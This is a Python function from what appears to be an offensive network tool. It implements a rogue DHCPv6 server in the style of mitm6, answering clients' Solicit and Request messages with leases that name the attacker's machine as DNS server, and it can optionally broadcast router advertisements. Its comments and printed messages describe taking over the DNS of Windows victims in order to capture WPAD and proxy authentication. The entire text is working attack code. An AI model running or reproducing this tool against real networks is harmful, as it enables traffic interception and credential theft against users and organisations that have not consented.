def roguedhcp6_cmd(args):
    """Rogue DHCPv6 (mitm6, Fox-IT 2018 recipe): race Solicits, hand out a
    fe80:: address built from the victim's own IPv4 (traceable) with 300s
    lifetimes (rollback-safe), and our link-local as DNS (opt 23). Windows
    prefers IPv6 DNS -> full DNS take-over -> wpad/proxy auth capture."""
    need_root()
    iface = args.iface
    mymac = my_mac(iface)
    ll = my_ll6(iface)
    dns6 = args.dns6 or ll
    server_duid = DUID_LL(lladdr=mymac)
    print(f"[*] rogue DHCPv6 on {iface}: DNS={dns6}, leases 300s in fe80:: "
          "(self-expiring rollback) - Windows victims prefer IPv6 DNS")
    print("    harvesting side: run a DNS server here & WPAD proxy "
          "- Solicits/Requests only touched, "
          + ("steering RAs ON" if args.ra else "no unsolicited RAs"))

    stop = threading.Event()
    if args.ra:
        ra_f = (Ether(src=mymac, dst="33:33:00:00:00:01") /
                IPv6(src=ll, dst="ff02::1", hlim=255) /
                ICMPv6ND_RA(chlim=64, M=1, O=1, routerlifetime=0) /
                ICMPv6NDOptSrcLLAddr(lladdr=mymac))

        def ra_loop():
            while not stop.wait(30):
                sendp(ra_f, iface=iface, verbose=0)
        threading.Thread(target=ra_loop, daemon=True).start()

    leases = {}

    def v4_map(src_ll):
        """RFC-mitm6: if src is IPv6 form of mapped IPv4 reuse, else hash."""
        h = hashlib.sha256(src_ll.encode()).hexdigest()
        return f"fe80::{int(h[:4], 16):x}:{int(h[4:8], 16):x}"

    def eth_mac(p):
        return p[Ether].src.lower() if p.haslayer(Ether) else None

    def answer(p):
        if not (p.haslayer(IPv6) and p.haslayer(UDP)):
            return
        wants_s = p.haslayer(DHCP6_Solicit)
        wants_r = (p.haslayer(DHCP6_Request)
                   or p.getlayer("DHCP6_Renew") is not None)
        if not (wants_s or wants_r):
            return
        if p[IPv6].src == ll or eth_mac(p) == mymac.lower():
            return
        if wants_s:
            upper = p[DHCP6_Solicit]
        elif p.haslayer(DHCP6_Request):
            upper = p[DHCP6_Request]
        else:
            upper = p.getlayer("DHCP6_Renew")
        trid = upper.trid
        # echo client id, detect server id targeting
        cid_opt = None
        sid_opt = None
        ia_na = None
        opt_l = upper.payload
        while opt_l and opt_l.name != "NoPayload":
            if isinstance(opt_l, DHCP6OptClientId):
                cid_opt = opt_l
            elif isinstance(opt_l, DHCP6OptServerId):
                sid_opt = opt_l
            elif isinstance(opt_l, DHCP6OptIA_NA):
                ia_na = opt_l
            opt_l = opt_l.payload
        if cid_opt is None:
            return
        if sid_opt is not None and wants_r:
            # only answer requests aimed at us
            if bytes(sid_opt.duid) != bytes(server_duid):
                return
        ckey = bytes(cid_opt.duid).hex()
        addr = leases.get(ckey)
        if not addr:
            addr = v4_map(f"{ckey}-{eth_mac(p) or ''}")
            leases[ckey] = addr
        iaaddr = DHCP6OptIAAddress(addr=addr, preflft=300, validlft=300)
        reply_opts = [
            DHCP6OptClientId(duid=cid_opt.duid),
            DHCP6OptServerId(duid=DUID_LL(lladdr=mymac)),
        ]
        if ia_na is not None:
            reply_opts.append(DHCP6OptIA_NA(iaid=ia_na.iaid, T1=150, T2=240,
                                            ianaopts=[iaaddr]))
        else:
            reply_opts.append(DHCP6OptIA_NA(ianaopts=[iaaddr]))
        reply_opts.append(DHCP6OptDNSServers(dnsservers=[dns6]))
        if args.domain:
            reply_opts.append(DHCP6OptDNSDomains(dnsdomains=[args.domain]))
        if wants_s:
            msg = DHCP6_Advertise(trid=trid)
        else:
            msg = DHCP6_Reply(trid=trid)
        out = (Ether(src=mymac, dst=p[Ether].src) /
               IPv6(src=ll, dst=p[IPv6].src) /
               UDP(sport=547, dport=546) / msg)
        for o in reply_opts:
            out = out / o
        sendp(out, iface=iface, verbose=0)
        kind = "ADVERTISE" if wants_s else "REPLY"
        print(f"  > {kind} to {p[IPv6].src}: iaaddr {addr}, dns {dns6}")

    try:
        sniff(iface=iface, filter="udp port 547 or udp port 546",
              timeout=args.time or None, store=False, prn=answer)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
    print(f"[*] stopped; {len(leases)} lease(s) issued (self-expire in "
          "~300s; victims recover via next Windows renewal)")
    return leases


